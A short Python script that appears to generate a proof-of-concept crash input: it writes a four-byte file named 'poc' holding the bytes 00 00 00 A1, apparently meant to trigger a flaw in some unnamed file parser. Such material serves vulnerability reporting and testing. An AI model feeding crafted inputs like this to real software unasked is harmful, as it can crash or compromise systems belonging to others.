def gen_poc():
    arr = []
    for i in range(0, 4):
        if i == 3:
            arr.append(0xa1)
        else:
            arr.append(0x00)
    with open("poc", "wb") as fp:
        fp.write(bytearray(arr))

if __name__ == '__main__':
    gen_poc()
